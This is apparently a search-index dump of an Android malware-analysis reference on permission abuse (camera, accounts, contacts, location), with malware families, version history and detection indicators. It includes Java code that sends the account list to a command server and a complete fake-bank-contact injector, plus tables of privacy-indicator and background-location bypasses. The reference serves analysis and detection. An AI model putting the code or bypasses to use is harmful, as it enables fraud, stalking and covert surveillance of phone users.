command.</p>"},{"location":"permissions/camera/camera/#covert-video-recording","title":"Covert Video Recording","text":"<p>Sustained video capture generates large files and keeps the camera session open, increasing detection risk on Android 12+ due to the persistent indicator. Malware mitigates this by:</p> <ul> <li>Recording short clips (10-30 seconds) rather than continuous video</li> <li>Compressing aggressively before exfiltration</li> <li>Recording only when triggered by C2 or on a schedule</li> <li>Combining with <code>RECORD_AUDIO</code> for video with sound</li> </ul>"},{"location":"permissions/camera/camera/#environmental-surveillance","title":"Environmental Surveillance","text":"<p>Rear camera captures the physical environment: room layout, documents on desks, computer screens, other people present. Front camera captures the user's face. Both contribute to intelligence collection in targeted espionage.</p>"},{"location":"permissions/camera/camera/#qr-code-screen-capture","title":"QR Code / Screen Capture","text":"<p>Camera pointed at another screen can read QR codes, capture credentials displayed on monitors, or photograph authentication tokens. Some malware combines camera access with OCR to extract text from captured images.</p>"},{"location":"permissions/camera/camera/#notable-families","title":"Notable Families","text":"Family Camera Usage Pegasus (NSO Group) Full camera control, covert capture on C2 command Predator (Cytrox) Camera and microphone surveillance FinSpy Scheduled photo capture, video recording Dendroid RAT Remote camera activation, photo + video DroidJack / SandroRAT Live camera streaming to C2 Hermit (RCS Lab) Camera capture as part of lawful intercept toolkit PhoneSpy Stalkerware with continuous camera access Mandrake Camera-based environment profiling BoneSpy Covert photo capture for Gamaredon-linked espionage operations PlainGnome Camera capture in second-stage surveillance payload EagleMsgSpy Remote camera activation for law enforcement surveillance KoSpy Camera capture for North Korean intelligence collection AridSpy Covert photo capture in multi-stage spyware framework PJobRAT Camera access for military-targeted espionage in South Asia LightSpy Dedicated camera plugin for photo and video capture SpyNote Remote camera activation and live streaming to operator"},{"location":"permissions/camera/camera/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>CAMERA</code> permission introduced. No runtime prompt.</p> <p>Android 6.0 (API 23): runtime permission required. User must explicitly grant.</p> <p>Android 9 (API 28): apps in the background cannot access the camera. Background camera use requires a foreground service. This was the first significant restriction on covert capture.</p> <p>Android 11 (API 30): one-time permissions introduced. Users can grant camera access for a single session only. The permission auto-revokes when the app moves to the background.</p> <p>Android 12 (API 31): privacy indicators added. A green dot appears in the status bar whenever the camera is in use. Users can see which app is accessing the camera by tapping the indicator. This is the single largest detection improvement for covert camera abuse.</p> <p>Android 12: quick settings toggles to disable camera and microphone globally. Even with the permission granted, the hardware is blocked when the toggle is off.</p> <p>Android 14 (API 34): foreground service type <code>camera</code> required. Apps must declare <code>android:foregroundServiceType=\"camera\"</code> in the manifest and in the <code>ServiceInfo</code>. Without this, camera access from a foreground service throws a <code>SecurityException</code>.</p> <p>Android 15 (API 35): further restrictions on foreground service types and background activity launches tighten the window for covert capture.</p>"},{"location":"permissions/camera/camera/#evasion-of-privacy-indicators","title":"Evasion of Privacy Indicators","text":"<p>The Android 12+ camera indicator is a significant obstacle. Known bypass approaches:</p> Technique Status Root + system app privileges Bypass indicators entirely (system camera service) Capture in sub-second bursts Indicator appears briefly, easy to miss Exploit camera HAL directly Device-specific, requires kernel/vendor exploit Use deprecated Camera1 API Indicator still applies (not a bypass) Disable indicator via ADB Requires prior ADB access, <code>settings put</code> command <p>On rooted devices or with a platform-level exploit, spyware can access the camera through the HAL layer or as a system process, avoiding the indicator entirely.</p>"},{"location":"permissions/camera/camera/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.CAMERA\" /&gt;\n</code></pre> <p>Static analysis indicators:</p> <ul> <li><code>CameraManager.openCamera()</code> or <code>Camera.open()</code> calls</li> <li><code>ImageReader</code> allocated without a corresponding visible <code>SurfaceView</code> in any layout XML</li> <li>1x1 dimension <code>SurfaceTexture</code> or <code>SurfaceView</code> creation</li> <li>Camera access combined with <code>INTERNET</code> permission and no camera-related UI in the app</li> <li><code>MediaRecorder</code> configured with <code>VideoSource.CAMERA</code> in a service rather than an activity</li> <li>Foreground service declared with type <code>camera</code> but no user-facing camera feature</li> </ul> <p>Runtime indicators on Android 12+: the green privacy indicator dot and the quick settings panel showing the accessing app.</p>"},{"location":"permissions/contacts/","title":"Contacts Permissions","text":"<p>Access to the device contact database and associated account information. Contacts are a high-value target for malware: they provide ready-made phone number lists for SMS worm propagation, social graph data for targeted phishing, and personal details (names, emails, addresses) for identity theft and reconnaissance.</p>"},{"location":"permissions/contacts/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CONTACTS Exfiltrate full contact database, build target lists for SMS worms, map social graph WRITE_CONTACTS Inject fake contacts, modify existing entries for social engineering GET_ACCOUNTS Enumerate accounts (Google, Exchange, etc.) on the device for account takeover or fingerprinting"},{"location":"permissions/contacts/#why-contacts-matter-offensively","title":"Why Contacts Matter Offensively","text":"<p>The contacts database is not just a phone book. It stores structured relationships, communication metadata, and often cross-linked account identifiers. A single contacts dump yields:</p> <ul> <li>Phone numbers for SMS phishing distribution (FluBot, Medusa)</li> <li>Email addresses for spear-phishing campaigns</li> <li>Organization names and job titles for targeted attacks</li> <li>Social graph edges for mapping who knows whom</li> <li>Account identifiers tied to Google, WhatsApp, Telegram, and other services</li> </ul>"},{"location":"permissions/contacts/#play-store-policy","title":"Play Store Policy","text":"<p>Google Play does not restrict contacts permissions as aggressively as SMS or Call Log. Apps can still request <code>READ_CONTACTS</code> with relatively weak justification (contact sync, social features). This makes contacts one of the easier dangerous permissions to abuse from a distribution standpoint.</p>"},{"location":"permissions/contacts/#common-permission-combinations","title":"Common Permission Combinations","text":"Combination Purpose <code>READ_CONTACTS</code> + <code>SEND_SMS</code> SMS worm propagation to all contacts <code>READ_CONTACTS</code> + <code>INTERNET</code> Contact exfiltration to C2 <code>READ_CONTACTS</code> + <code>READ_SMS</code> Full communication graph reconstruction <code>READ_CONTACTS</code> + <code>GET_ACCOUNTS</code> Link contacts to device accounts for identity mapping"},{"location":"permissions/contacts/get-accounts/","title":"GET_ACCOUNTS","text":"<p>Allows listing the accounts registered on the device (Google, Samsung, Exchange, etc.). Reveals which services the user has accounts with, useful for targeted phishing and account enumeration.</p>"},{"location":"permissions/contacts/get-accounts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.GET_ACCOUNTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/get-accounts/#what-it-enables","title":"What It Enables","text":"<pre><code>AccountManager am = AccountManager.get(context);\nAccount[] accounts = am.getAccounts();\nfor (Account account : accounts) {\n    String type = account.type;   // \"com.google\", \"com.samsung.account\", etc.\n    String name = account.name;   // email address or username\n}\n</code></pre> <p>Returns account type and name (typically email address) for all accounts on the device.</p>"},{"location":"permissions/contacts/get-accounts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/get-accounts/#email-harvesting","title":"Email Harvesting","text":"<p>Extract email addresses associated with device accounts. These are confirmed valid addresses tied to a real person.</p>"},{"location":"permissions/contacts/get-accounts/#service-identification","title":"Service Identification","text":"<p>Account types reveal which services the user uses: Google, Microsoft Exchange (corporate), Samsung, Facebook, banking apps with account integration.</p>"},{"location":"permissions/contacts/get-accounts/#targeted-phishing","title":"Targeted Phishing","text":"<p>Knowing the exact email addresses allows crafting targeted phishing emails that reference the victim's actual account.</p>"},{"location":"permissions/contacts/get-accounts/#account-enumeration-for-overlay-targeting","title":"Account Enumeration for Overlay Targeting","text":"<p>Banking trojans use <code>GET_ACCOUNTS</code> to determine which financial services the victim uses, then load the corresponding overlay injection pages from C2. This avoids downloading inject templates for all targets and reduces network footprint.</p> <pre><code>AccountManager am = AccountManager.get(context);\nAccount[] accounts = am.getAccounts();\nArrayList&lt;String&gt; accountTypes = new ArrayList&lt;&gt;();\nfor (Account account : accounts) {\n    accountTypes.add(account.type);\n}\nJSONObject payload = new JSONObject();\npayload.put(\"accounts\", new JSONArray(accountTypes));\npayload.put(\"bot_id\", deviceId);\nsendToC2(payload.toString());\n</code></pre>"},{"location":"permissions/contacts/get-accounts/#notable-families","title":"Notable Families","text":"Family GET_ACCOUNTS Usage Cerberus <code>getAccounts</code> C2 command steals all accounts stored on device Alien Inherited <code>getAccounts</code> command from Cerberus fork; exfiltrates account list to C2 Ermac <code>getAccounts</code> bot command steals device accounts via <code>AccountManager</code> Hook Inherited all 30 Ermac commands including <code>getAccounts</code> for account theft <p>The entire Cerberus lineage -- Cerberus, Alien, Ermac, Hook -- includes a dedicated <code>getAccounts</code> bot command. This command calls <code>AccountManager.getAccounts()</code>, serializes the results, and sends them to C2. The stolen account list serves two purposes: identifying high-value targets (users with banking or crypto accounts) and harvesting email addresses for further phishing campaigns.</p>"},{"location":"permissions/contacts/get-accounts/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): became a runtime permission. Prior to this, any app could silently enumerate all accounts at install time.</p> <p>Android 8.0 (API 26): <code>GET_ACCOUNTS</code> is no longer required for accessing accounts belonging to the same developer (same package signature). Apps can access their own accounts without this permission. This change reduced the number of legitimate apps requesting the permission, making its presence more suspicious.</p> <p>Android 10 (API 29): contacts and account-related permissions were further separated. <code>GET_ACCOUNTS</code> no longer automatically grants access to contact data.</p> <p>Android 11 (API 30): <code>GET_ACCOUNTS</code> provides limited data. Many account types restrict visibility to protect user privacy. Account authenticators can now declare their accounts as not visible to third-party apps.</p> <p>Android 14 (API 34): further restrictions on cross-app account visibility. The trend has been to progressively limit what <code>GET_ACCOUNTS</code> reveals, though older devices remain fully exposed.</p>"},{"location":"permissions/contacts/get-accounts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.GET_ACCOUNTS\" /&gt;\n</code></pre> <p>Decreasingly useful due to Android restrictions. Modern malware uses other methods for account enumeration.</p>"},{"location":"permissions/contacts/get-accounts/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<ul> <li>Calls to <code>AccountManager.get(context).getAccounts()</code> or <code>getAccountsByType()</code></li> <li>Serialization of <code>Account</code> objects into JSON or other wire formats</li> <li>Account data passed to network transmission methods</li> </ul>"},{"location":"permissions/contacts/get-accounts/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>App accesses <code>AccountManager</code> immediately after launch or permission grant</li> <li>Account type strings (\"com.google\", \"com.samsung.account\") appearing in network traffic</li> <li>Email addresses from device accounts in exfiltrated data</li> </ul>"},{"location":"permissions/contacts/get-accounts/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>GET_ACCOUNTS</code> combined with <code>INTERNET</code> and no visible account management UI is a strong indicator of reconnaissance. When combined with SYSTEM_ALERT_WINDOW or BIND_ACCESSIBILITY_SERVICE, it suggests the app enumerates accounts to select which overlay targets to deploy.</p>"},{"location":"permissions/contacts/read-contacts/","title":"READ_CONTACTS","text":"<p>Grants read access to the device's contact database via the Contacts content provider. Primary use in malware: bulk exfiltration of contact data for social graph mapping, building SMS worm target lists, and harvesting personal details for identity theft. FluBot famously used this to read all contacts and send phishing SMS to every number found.</p>"},{"location":"permissions/contacts/read-contacts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CONTACTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/read-contacts/#what-it-enables","title":"What It Enables","text":"<p>Access to the Contacts content provider at <code>content://com.android.contacts/</code>. The app can query all stored contacts and their associated data.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,\n    new String[]{\n        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,\n        ContactsContract.CommonDataKinds.Phone.NUMBER\n    },\n    null, null, null\n);\n</code></pre> <p>Data accessible per contact:</p> Field Content Display name Full contact name Phone numbers All stored numbers (mobile, work, home) Email addresses All associated emails Organization Company name, job title Postal address Physical addresses Notes Free-text notes field Photo Contact photo URI Groups Group membership (family, coworkers) Account Which account synced this contact (Google, Exchange) Last contacted Timestamp of last communication <p>The contact database is relational. A single query can join across tables to extract raw contacts, data rows, and aggregated contacts in bulk. The <code>ContactsContract.Data</code> table holds everything: phone numbers, emails, structured names, organizations, and custom MIME-typed data rows added by third-party apps.</p>"},{"location":"permissions/contacts/read-contacts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/read-contacts/#contact-exfiltration","title":"Contact Exfiltration","text":"<p>The most common abuse pattern. Malware dumps all contacts and sends them to C2. This provides:</p> <ul> <li>Personal details for identity theft</li> <li>Phone numbers and emails for phishing campaigns</li> <li>Organizational data for targeting corporate environments</li> </ul> <p>Exfiltration typically happens silently in a background service. The entire contacts database for an average user (hundreds of entries) is small enough to transmit in a single HTTP POST.</p>"},{"location":"permissions/contacts/read-contacts/#sms-worm-target-lists","title":"SMS Worm Target Lists","text":"<p>FluBot (2021-2022) was the most prominent example. After installation, it read all contacts and sent phishing SMS to every phone number, directing recipients to download the malware. This contact-to-SMS pipeline enabled exponential spreading across Europe and Australia.</p> <p>Other families using the same approach:</p> Family Contact Abuse FluBot Read all contacts, sent phishing SMS to each number. Explosive European spread. Medusa Contact harvesting for SMS-based spreading Anatsa Contact exfiltration to C2 for targeted campaigns Hydra Bulk contact dump for downstream phishing Anubis Contact theft combined with SMS interception Crocodilus Contact list injection: adds fake \"Bank Support\" entries SpyNote Full contact exfiltration as part of surveillance MoqHao Contact harvesting for smishing distribution SpyLoan Bulk contact theft, weaponized for harassment and extortion of borrowers Rafel RAT Contact exfiltration across 120+ campaigns"},{"location":"permissions/contacts/read-contacts/#social-graph-mapping","title":"Social Graph Mapping","text":"<p>Contacts reveal relationship structures. Malware or spyware operators can reconstruct who knows whom by correlating contacts across compromised devices. This is especially valuable in targeted surveillance operations where the objective is mapping an entire network, not just a single target.</p>"},{"location":"permissions/contacts/read-contacts/#targeted-phishing","title":"Targeted Phishing","text":"<p>With access to contact names, an attacker can craft SMS or email messages that appear to come from a known contact. Combining <code>READ_CONTACTS</code> with <code>SEND_SMS</code> allows sending messages that reference the target by name, dramatically increasing phishing success rates.</p>"},{"location":"permissions/contacts/read-contacts/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): runtime permission required. Prior to this, contacts access was granted at install time with no user interaction.</p> <p>Android 8.0 (API 26): granting <code>READ_CONTACTS</code> no longer automatically grants <code>GET_ACCOUNTS</code>. These were split into separate permissions, reducing the data exposed by a single grant.</p> <p>Android 11 (API 30): no functional changes, but the permissions auto-reset feature can revoke <code>READ_CONTACTS</code> for unused apps, limiting long-term passive collection.</p> <p>Android 15 (API 35): enhanced permission rationale requirements. The runtime dialog can show app-specific justification text.</p>"},{"location":"permissions/contacts/read-contacts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CONTACTS\" /&gt;\n</code></pre> <p>High-risk indicator when combined with:</p> <ul> <li><code>SEND_SMS</code>: SMS worm pattern (read contacts, send phishing)</li> <li><code>INTERNET</code> + <code>RECEIVE_BOOT_COMPLETED</code>: background exfiltration with persistence</li> <li><code>READ_SMS</code> + <code>READ_CALL_LOG</code>: full communication surveillance</li> </ul> <p>Look for <code>ContentResolver.query()</code> calls targeting <code>ContactsContract</code> URIs in decompiled code. Bulk queries with no projection filtering (selecting all columns) suggest exfiltration rather than legitimate lookup. Background services or <code>WorkManager</code> tasks querying contacts without corresponding UI activity are strong indicators.</p>"},{"location":"permissions/contacts/write-contacts/","title":"WRITE_CONTACTS","text":"<p>Allows creating, modifying, and deleting contacts on the device. Can be used to inject contacts for social engineering or modify existing contacts to redirect calls/messages.</p>"},{"location":"permissions/contacts/write-contacts/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CONTACTS</code> Protection Level <code>dangerous</code> Permission Group <code>CONTACTS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/contacts/write-contacts/#what-it-enables","title":"What It Enables","text":"<p>Full write access to the <code>ContactsContract</code> content provider:</p> <ul> <li>Create new contacts</li> <li>Modify existing contact details (phone numbers, emails)</li> <li>Delete contacts</li> <li>Modify contact photos</li> </ul>"},{"location":"permissions/contacts/write-contacts/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/contacts/write-contacts/#contact-poisoning","title":"Contact Poisoning","text":"<p>Modify a legitimate contact's phone number to redirect calls to an attacker-controlled number. When the victim calls \"their bank,\" they reach the attacker instead.</p>"},{"location":"permissions/contacts/write-contacts/#social-engineering-setup","title":"Social Engineering Setup","text":"<p>Inject a fake contact (e.g., \"Bank Security\" with the attacker's number) so that when the attacker calls, the victim sees a trusted name on caller ID.</p>"},{"location":"permissions/contacts/write-contacts/#evidence-destruction","title":"Evidence Destruction","text":"<p>Delete contacts to destroy evidence of communication or to disrupt the victim's phone.</p>"},{"location":"permissions/contacts/write-contacts/#notable-families","title":"Notable Families","text":"Family Usage Crocodilus Injects fake \"Bank Support\" contacts to enable convincing vishing (voice phishing) calls <p>Crocodilus uses <code>WRITE_CONTACTS</code> to plant fake entries in the victim's contact list with names like \"Bank Support\" or the real name of their bank's customer service department. When the operators later call the victim from the number associated with these fake contacts, the victim's phone displays the spoofed contact name on caller ID. This makes the incoming call appear to originate from the victim's bank, enabling highly convincing social engineering where the attacker poses as bank staff and instructs the victim to approve transactions or provide credentials.</p>"},{"location":"permissions/contacts/write-contacts/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class ContactInjector {\n\n    private final ContentResolver resolver;\n\n    public ContactInjector(ContentResolver resolver) {\n        this.resolver = resolver;\n    }\n\n    public void injectFakeBankContact(String displayName, String phoneNumber) {\n        ArrayList&lt;ContentProviderOperation&gt; ops = new ArrayList&lt;&gt;();\n\n        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)\n            .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)\n            .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)\n            .build());\n\n        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)\n            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)\n            .withValue(ContactsContract.Data.MIMETYPE,\n                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)\n            .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME,\n                displayName)\n            .build());\n\n        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)\n            .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)\n            .withValue(ContactsContract.Data.MIMETYPE,\n                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)\n            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, phoneNumber)\n            .withValue(ContactsContract.CommonDataKinds.Phone.TYPE,\n                ContactsContract.CommonDataKinds.Phone.TYPE_WORK)\n            .build());\n\n        try {\n            resolver.applyBatch(ContactsContract.AUTHORITY, ops);\n        } catch (Exception e) {\n        }\n    }\n\n    public void replaceExistingContactNumber(String targetName, String newNumber) {\n        Cursor cursor = resolver.query(\n            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,\n            new String[]{ContactsContract.CommonDataKinds.Phone._ID},\n            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + \" = ?\",\n            new String[]{targetName},\n            null\n        );\n\n        if (cursor == null) return;\n\n        while (cursor.moveToNext()) {\n            long phoneId = cursor.getLong(0);\n            ContentValues values = new ContentValues();\n            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, newNumber);\n            resolver.update(\n                ContentUris.withAppendedId(ContactsContract.Data.CONTENT_URI, phoneId),\n                values, null, null\n            );\n        }\n        cursor.close();\n    }\n}\n</code></pre> <p>The code demonstrates both injection patterns: creating entirely new fake contacts and modifying existing contact phone numbers. The second technique is more dangerous because the victim already trusts the contact name -- replacing the real bank's number with the attacker's means the victim will unknowingly call the attacker when they look up their bank.</p>"},{"location":"permissions/contacts/write-contacts/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.0 (API 14): <code>ContactsContract</code> API stabilized. The content provider model for contacts has remained largely consistent since.</p> <p>Android 6.0 (API 23): runtime permission required. <code>WRITE_CONTACTS</code> and <code>READ_CONTACTS</code> are in the same <code>CONTACTS</code> permission group, so granting one may grant the other depending on the Android version.</p> <p>Android 11 (API 30): no significant changes to the permission itself, but package visibility restrictions mean apps must declare which content providers they interact with, adding a minor layer of visibility into contact manipulation intent.</p>"},{"location":"permissions/contacts/write-contacts/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CONTACTS\" /&gt;\n</code></pre> <p>Less commonly requested than <code>READ_CONTACTS</code>. Any app requesting write access without clear contact management functionality is suspicious.</p>"},{"location":"permissions/contacts/write-contacts/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li>Look for <code>ContentProviderOperation.newInsert()</code> calls targeting <code>ContactsContract.RawContacts</code> and <code>ContactsContract.Data</code> content URIs -- this is the contact injection pattern.</li> <li>Contact updates targeting <code>ContactsContract.CommonDataKinds.Phone</code> with new phone numbers indicate number replacement attacks.</li> <li>Check for hardcoded strings resembling bank names (\"Customer Support,\" \"Security Department,\" financial institution names) used as display names in contact creation.</li> <li>Combined with <code>READ_CONTACTS</code> and call-related permissions (<code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code>), <code>WRITE_CONTACTS</code> indicates a vishing-oriented attack chain as seen in Crocodilus.</li> <li>Batch operations (<code>applyBatch</code>) that insert multiple contacts at once suggest programmatic injection rather than user-initiated contact creation.</li> <li>Timestamp analysis on device contacts can reveal contacts created during suspicious timeframes that the user did not manually add.</li> </ul>"},{"location":"permissions/contacts/write-contacts/#see-also","title":"See Also","text":"<ul> <li>READ_CONTACTS -- typically paired with <code>WRITE_CONTACTS</code> to read existing contacts before modifying or injecting new ones</li> <li>Phishing Techniques -- contact poisoning and fake contact injection support vishing and social engineering attacks</li> <li>CALL_PHONE -- combined with <code>WRITE_CONTACTS</code>, enables full vishing attack chains where the malware both plants fake contacts and initiates or redirects calls</li> </ul>"},{"location":"permissions/location/","title":"Location Permissions","text":"<p>Location permissions expose the device's physical position through GPS, WiFi, cell tower triangulation, and fused providers. From an offense perspective, location data enables stalkerware tracking, spyware geolocation reporting, geofenced payload activation, and victim profiling.</p>"},{"location":"permissions/location/#permissions","title":"Permissions","text":"Permission Abuse Potential ACCESS_FINE_LOCATION GPS-precision tracking, stalkerware, geofence-triggered payloads ACCESS_COARSE_LOCATION Approximate location via network, city-level victim profiling ACCESS_BACKGROUND_LOCATION Continuous tracking without foreground UI, persistent stalkerware"},{"location":"permissions/location/#permission-model","title":"Permission Model","text":"<p>Android splits location into two axes: precision (fine vs coarse) and timing (foreground vs background).</p> <p>Precision: <code>ACCESS_FINE_LOCATION</code> provides GPS-level accuracy (within meters). <code>ACCESS_COARSE_LOCATION</code> uses WiFi and cell towers for approximately 1-2km accuracy. Since Android 12, users can downgrade a fine location request to approximate at grant time.</p> <p>Timing: Before Android 10, any location permission worked regardless of app state. Android 10 introduced <code>ACCESS_BACKGROUND_LOCATION</code> as a separate grant. Without it, an app only receives location updates while it has a visible activity or foreground service with the <code>location</code> type.</p> <p>Grant flow on Android 12+:</p> <ol> <li>App requests <code>ACCESS_FINE_LOCATION</code> and <code>ACCESS_COARSE_LOCATION</code></li> <li>User sees dialog with \"Precise\" / \"Approximate\" toggle</li> <li>User selects \"While using the app\" or \"Only this time\"</li> <li>Background location must be requested separately and directs the user to Settings</li> </ol>"},{"location":"permissions/location/#why-location-tracking-matters-for-malware","title":"Why Location Tracking Matters for Malware","text":""},{"location":"permissions/location/#stalkerware-and-spyware","title":"Stalkerware and Spyware","text":"<p>Location is the highest-value data point for stalkerware. Continuous GPS tracking reveals a target's home address, workplace, daily routine, and travel patterns. Commercial spyware (Pegasus, Predator) and consumer stalkerware (Cerberus, TheTruthSpy) both prioritize location collection. Many stalkerware families implement their own location polling loop using <code>FusedLocationProviderClient</code> to balance accuracy against battery drain.</p>"},{"location":"permissions/location/#geofenced-payload-activation","title":"Geofenced Payload Activation","text":"<p>Banking trojans and targeted implants use geofencing to activate only in specific countries or regions. The malware checks the victim's coordinates against a target area before deploying its overlay attacks or exfiltrating data. This avoids triggering sandbox analysis (most sandboxes report locations in the US or default to null island at 0,0) and limits exposure to researchers outside the target region.</p>"},{"location":"permissions/location/#victim-profiling","title":"Victim Profiling","text":"<p>Even coarse location data reveals which country and city the victim is in. Malware uses this to select the correct phishing overlay language, target the right banking apps, or decide whether to self-destruct to avoid analysis in non-target regions.</p>"},{"location":"permissions/location/#play-store-policy","title":"Play Store Policy","text":"<p>Google Play requires apps using background location to demonstrate core functionality that depends on it. Since 2020, apps must submit a declaration form and pass review. Most stalkerware and spyware distribute through sideloading, third-party stores, or MDM-based installation to bypass these restrictions.</p>"},{"location":"permissions/location/#bypass-techniques","title":"Bypass Techniques","text":"Technique How It Works Foreground service abuse Declare a <code>location</code>-type foreground service with a persistent notification to maintain foreground location access without <code>ACCESS_BACKGROUND_LOCATION</code> WorkManager polling Schedule periodic work that briefly requests location during execution windows AlarmManager wakeups Wake the app at intervals to grab a location fix before the system kills the process WiFi scan results Use <code>ACCESS_WIFI_STATE</code> to scan nearby access points and geolocate via public WiFi databases without location permission Cell tower info Read <code>TelephonyManager</code> cell info (requires <code>ACCESS_FINE_LOCATION</code> or <code>READ_PHONE_STATE</code> on older APIs) to triangulate position IP geolocation Query an external service to resolve the device's IP to an approximate location with no permissions at all"},{"location":"permissions/location/access-background-location/","title":"ACCESS_BACKGROUND_LOCATION","text":"<p>Allows an app to receive location updates when it has no visible activity or foreground service. This is the permission that separates passive location checks from persistent tracking. Critical for stalkerware, spyware, and any implant that needs to log the victim's movements continuously without user interaction.</p>"},{"location":"permissions/location/access-background-location/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.ACCESS_BACKGROUND_LOCATION</code> Protection Level <code>dangerous</code> Permission Group <code>LOCATION</code> Grant Method Settings page redirect (Android 11+) or runtime dialog (Android 10) Introduced API 29 (Android 10)"},{"location":"permissions/location/access-background-location/#what-it-enables","title":"What It Enables","text":"<p>Without this permission, location updates are only delivered while the app has a visible activity or a foreground service with type <code>location</code>. With it, the app receives location updates regardless of its lifecycle state.</p> <p>Background location works through:</p> <ul> <li><code>FusedLocationProviderClient.requestLocationUpdates()</code> with a <code>PendingIntent</code> that fires even when the app is killed</li> <li><code>GeofencingClient.addGeofences()</code> for enter/exit/dwell triggers on geographic regions</li> <li><code>LocationManager.requestLocationUpdates()</code> targeting background delivery</li> <li><code>WorkManager</code> or <code>JobScheduler</code> tasks that read <code>getLastKnownLocation()</code> during execution</li> </ul> <p>The precision of background location depends on which foreground permission was granted:</p> Foreground Permission Background Result <code>ACCESS_FINE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> GPS-accuracy updates in background <code>ACCESS_COARSE_LOCATION</code> + <code>ACCESS_BACKGROUND_LOCATION</code> Approximate updates in background <code>ACCESS_FINE_LOCATION</code> only (user chose approximate on Android 12+) Approximate updates in background"},{"location":"permissions/location/access-background-location/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/location/access-background-location/#persistent-stalkerware-tracking","title":"Persistent Stalkerware Tracking","text":"<p>This is the primary stalkerware permission. Without it, the app must maintain a visible foreground notification to keep tracking, which alerts the victim. With background location, tracking is invisible. The app registers a <code>PendingIntent</code>-based location request that survives app process death and continues to fire at configured intervals.</p> <p>Stalkerware logging pattern:</p> <ol> <li>Register <code>PendingIntent</code> for location updates every 5-15 minutes</li> <li><code>BroadcastReceiver</code> fires on each update</li> <li>Location is written to a local database</li> <li>Periodic sync job pushes accumulated locations to C2</li> <li>If the process is killed, the <code>PendingIntent</code> re-triggers it</li> </ol>"},{"location":"permissions/location/access-background-location/#geofence-based-payload-activation","title":"Geofence-Based Payload Activation","text":"<p>Advanced malware uses <code>GeofencingClient</code> with background location to trigger actions when the victim enters a specific area. Use cases:</p> <ul> <li>Banking trojan activates overlay attacks only when the device is in the target country</li> <li>Targeted implant begins full surveillance when the victim arrives at a location of interest</li> <li>Ransomware holds off deployment until the victim is in a jurisdiction where payment is likely</li> </ul> <p>Geofences survive app restart and process death, making them reliable persistent triggers.</p>"},{"location":"permissions/location/access-background-location/#continuous-intelligence-collection","title":"Continuous Intelligence Collection","text":"<p>Nation-state implants log location continuously to build movement profiles. The data reveals:</p> <ul> <li>Home and work addresses (most frequent nighttime and daytime locations)</li> <li>Daily routine and travel patterns</li> <li>Meetings with other tracked targets (co-location analysis)</li> <li>Travel to sensitive locations (government buildings, embassies, protest sites)</li> </ul>"},{"location":"permissions/location/access-background-location/#notable-families","title":"Notable Families","text":"Family Background Location Usage Pegasus (NSO Group) Continuous background GPS logging with encrypted exfiltration Predator (Cytrox) Background tracking tied to C2 tasking commands FlexiSPY Configurable background polling interval, route reconstruction TheTruthSpy Persistent background tracking marketed for \"partner monitoring\" Cerberus Background geofencing combined with overlay injection Monokle (STC) Background location as part of full surveillance toolkit PhoneSpy Background tracking with location history stored in local SQLite"},{"location":"permissions/location/access-background-location/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): <code>ACCESS_BACKGROUND_LOCATION</code> introduced. Apps targeting API 29+ must request it explicitly. The runtime dialog shows \"Allow all the time\" as an option when background location is requested alongside foreground location. Apps targeting API 28 or below automatically receive background access when granted foreground location (compatibility behavior).</p> <p>Android 11 (API 30): Incremental grants enforced. The system blocks requesting <code>ACCESS_BACKGROUND_LOCATION</code> in the same dialog as foreground permissions. The app must first obtain foreground location, then separately request background. The second request opens the app's Settings page where the user manually selects \"Allow all the time.\" This two-step flow significantly reduces 